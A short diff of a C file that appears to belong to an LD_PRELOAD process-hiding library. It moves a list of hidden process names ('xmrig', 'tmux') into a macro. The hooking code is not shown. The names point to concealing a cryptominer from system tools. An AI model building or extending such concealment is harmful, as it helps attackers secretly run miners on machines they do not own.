@@ -1,5 +1,7 @@
-#define _GNU_SOURCE
 #define PROCESS_COUNT 2
+#define PROCESS_LIST {"xmrig","tmux"}
+
+#define _GNU_SOURCE
 
 #include <stdio.h>
 #include <dlfcn.h>
@@ -8,7 +10,7 @@
 #include <unistd.h>
 
 
-static const char* filterProcess[PROCESS_COUNT] = {"xmrig","tmux"};
+static const char* filterProcess[PROCESS_COUNT] = PROCESS_LIST;
 
 int checkFilterProcess(char *processName)
 {
